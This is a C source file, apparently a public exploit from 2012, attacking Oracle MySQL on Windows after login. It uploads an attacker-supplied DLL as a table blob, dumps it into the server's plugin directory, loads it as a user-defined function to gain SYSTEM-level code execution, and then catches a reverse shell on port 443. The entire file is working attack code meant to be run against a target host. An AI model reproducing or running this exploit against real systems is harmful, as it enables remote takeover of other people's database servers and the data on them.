/* Oracle MySQL on Windows Remote SYSTEM Level Exploit zeroday
 * Copyright (C) 2012 Kingcope
 *
 * Thanks to danny.
 */
         
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <mysql/mysql.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>

void start_reverse_handler(unsigned short);
int shell(int s, char* tip);

void usage(char *argv[]) {
	puts("\n");
	printf("usage: %s <-u username> <-p password> <-t targethost>\n\n", argv[0]);
	exit(1);
}

int main(int argc, char *argv[])
{
  MYSQL *c;
  unsigned char *target = (unsigned char*)0;
  unsigned char *username = (unsigned char*)0;
  unsigned char *password = (unsigned char*)0;
  unsigned char *payload = (unsigned char*)0;
  unsigned char *payload2 = (unsigned char*)0;
  unsigned char *thequery = (unsigned char*)0;
  unsigned char *stat = "INSERT INTO spearhead(weapon) VALUES('%s')";
  unsigned char *dump = (unsigned char*)0;
  MYSQL_ROW plugin_dir;
  FILE *input = (FILE*)0;
  int size=-1;
  int j;
  unsigned int querylen, randno;
  MYSQL_RES *result;
  pid_t pid;

  printf("Oracle MySQL Windows SYSTEM Level Exploit (post-auth) zeroday\n""Copyright (C) 2012 Kingcope\n");

  while((j=getopt(argc, argv, "u:p:t:")) != -1) {
	switch(j) {
		case 'u':
			username = optarg;
			break;
		case 'p':
			password = optarg;
			break;
		case 't':
			target = optarg;
			break;
		default:
		        usage(argv);
	}
  }

  if (username == (unsigned char*)0 ||
      password == (unsigned char*)0 ||
      target == (unsigned char*)0) usage(argv);

  c = mysql_init(NULL);
  if (c == NULL) {
	printf("Error %u: %s\n", mysql_errno(c), mysql_error(c));
      	exit(1);
  }

  if (mysql_real_connect(c, target, username, 
          password, "mysql", 0, NULL, 0) == NULL) {
      printf("Error %u: %s\n", mysql_errno(c), mysql_error(c));
      exit(1);
  }

  printf("Successfully Logged into MySQL Server\n""Att3mpt to R00T the b0x!\n");

  if (mysql_query(c, "drop database spearhead") && (mysql_errno(c) != 1008)) {
      printf("Error %u: %s\n", mysql_errno(c), mysql_error(c));
      exit(1);
  }

  if (mysql_query(c, "create database spearhead") && (mysql_errno(c) != 1007)) {
      printf("Error %u: %s\n", mysql_errno(c), mysql_error(c));
      exit(1);
  }

  if (mysql_query(c, "use spearhead")) {
      printf("Error %u: %s\n", mysql_errno(c), mysql_error(c));
      exit(1);
  }

  if (mysql_query(c, "create table spearhead(weapon LONGBLOB)") && (mysql_errno(c) != 1050)) {
      printf("Error %u: %s\n", mysql_errno(c), mysql_error(c));
      exit(1);
  }
  
  input = fopen("payload.dll", "r+b");
  if (input == (FILE*)0) {
	printf("Error: Could not open payload.dll\n");
	exit(1);
  }

  fseek(input, 0L, SEEK_END);
  size = ftell(input);
  if (size < 0) {
	printf("Error: Could not retrieve filesize of payload.dll\n");
	exit(1);
  }
  fseek(input, 0L, SEEK_SET);
  payload = (unsigned char *) malloc(size);
  if (payload == (unsigned char *)0) {
	printf("Error: Could not allocate memory\n");
	exit(1);
  }

  if (fread(payload, size, 1, input) < 1) {
	printf("Error: Could not read payload.dll\n");
	exit(1);
  }
  fclose(input);

  payload2 = (unsigned char *) malloc(size*2+1);
  if (payload2 == (unsigned char *)0) {
	printf("Error: Could not allocate memory\n");
	exit(1);
  }

  mysql_real_escape_string(c, payload2, payload, size);

  thequery = (unsigned char*) malloc(size*2+strlen(stat)+2);
  if (thequery == (unsigned char*)0) {
	printf("Error: could not allocate buffer\n");
	exit(1);
  }
  querylen = snprintf(thequery, size*2+strlen(stat)+2, stat, payload2);
 
  if (mysql_real_query(c, thequery, querylen)) {
      printf("Error %u: %s\n", mysql_errno(c), mysql_error(c));
      exit(1);
  }

  dump = (unsigned char*) malloc(4096);
  if (dump == (unsigned char*)0) {
	printf("Error: could not allocate buffer\n");
	exit(1);
  }

  mysql_query(c, "SELECT REPLACE(REPLACE(@@plugin_dir, '/', '\\\\') ,'\\\\', '\\\\\\\\')");
  result = mysql_store_result(c);
  if (result == NULL) {
      printf("Error %u: %s\n", mysql_errno(c), mysql_error(c));
      exit(1);
  }
  plugin_dir = mysql_fetch_row(result);

  srandom(time(NULL));
  randno = random();
  printf("Save payload to %s\\payload%d.dll\n", plugin_dir[0], randno); 
  querylen = snprintf(dump, 4096, "SELECT weapon FROM spearhead INTO DUMPFILE '%s\\\\payload%d.dll'", plugin_dir[0], randno);

  if (mysql_real_query(c, dump, querylen)) {
      printf("Error %u: %s\n", mysql_errno(c), mysql_error(c));
      exit(1);
  }

  pid = fork();
  if (pid == 0) {
	sleep(1);
  	snprintf(dump, 4096, "CREATE FUNCTION mysqljackpot RETURNS STRING SONAME 'payload%d.dll'", randno);
  	if (mysql_query(c, dump)) {
      		printf("Error %u: %s\n", mysql_errno(c), mysql_error(c));
      		exit(1);
  	}

  	if (mysql_query(c, "drop database spearhead")) {
     		printf("Error %u: %s\n", mysql_errno(c), mysql_error(c));
      		exit(1);
  	}

  	if (mysql_query(c, "drop function mysqljackpot")) {
      		printf("Error %u: %s\n", mysql_errno(c), mysql_error(c));
      		exit(1);
  	}
	wait(0);
  } else {
	start_reverse_handler(443);
  }

  printf("Done.\n");
  mysql_close(c);
}

/* REVERSE SHELL HANDLING CODE */
/* borrowed from code by cybertronic - cybertronic[at]gmx[dot]net */
void
start_reverse_handler ( unsigned short cbport )
{
        int s1, s2;
        struct sockaddr_in cliaddr, servaddr;
        socklen_t clilen = sizeof ( cliaddr );

        bzero ( &servaddr, sizeof ( servaddr ) );
        servaddr.sin_family = AF_INET;
        servaddr.sin_addr.s_addr = htonl ( INADDR_ANY );
        servaddr.sin_port = htons ( cbport );

        printf ( "Starting Reverse Shell Handler on Port %d", cbport );
        if ( ( s1 = socket ( AF_INET, SOCK_STREAM, 0 ) ) == -1 )
        {
                printf ( "socket failed!\n" );
                exit ( 1 );
        }
        bind ( s1, ( struct sockaddr * ) &servaddr, sizeof ( servaddr ) );
        if ( listen ( s1, 1 ) == -1 )
        {
                printf ( "listen failed!\n" );
                exit ( 1 );
        }
        if ( ( s2 = accept ( s1, ( struct sockaddr * ) &cliaddr, &clilen ) ) < 0 )
        {
                printf ( "accept failed!\n" );
                exit ( 1 );
        }
        close ( s1 );
        printf ( "\n\nw==T W==T\n\n");
        shell ( s2, ( char* ) inet_ntoa ( cliaddr.sin_addr ) );
        close ( s2 );
}

int
shell ( int s, char* tip )
{
        int n;
        char* cmd = "whoami\n";
        char buffer[2048];
        fd_set fd_read;

        if ( write ( s, cmd, strlen ( cmd ) ) < 0 )
        {
                printf ( "bye bye :>\n" );
                return;
        }
        
        FD_ZERO ( &fd_read );
        FD_SET ( s, &fd_read );
        FD_SET ( 0, &fd_read );

        while ( 1 )
        {
                FD_SET ( s, &fd_read );
                FD_SET ( 0, &fd_read );

                if ( select ( s + 1, &fd_read, NULL, NULL, NULL ) < 0 )
                        break;
                if ( FD_ISSET ( s, &fd_read ) )
                {
                        if ( ( n = recv ( s, buffer, sizeof ( buffer ), 0 ) ) < 0 )
                        {
                                printf ( "bye bye :>\n" );
                                return;
                        }
                        if ( write ( 1, buffer, n ) < 0 )
                        {
                                printf ( "bye bye :>\n" );
                                return;
                        }
                }
                if ( FD_ISSET ( 0, &fd_read ) )
                {
                        if ( ( n = read ( 0, buffer, sizeof ( buffer ) ) ) < 0 )
                        {
                                printf ( "bye bye :>\n" );
                                return;
                        }
                        if ( send ( s, buffer, n, 0 ) < 0 )
                        {
                                printf ( "bye bye :>\n" );
                                return;
                        }
                }
                usleep(10);
        }
}

/* EoF */

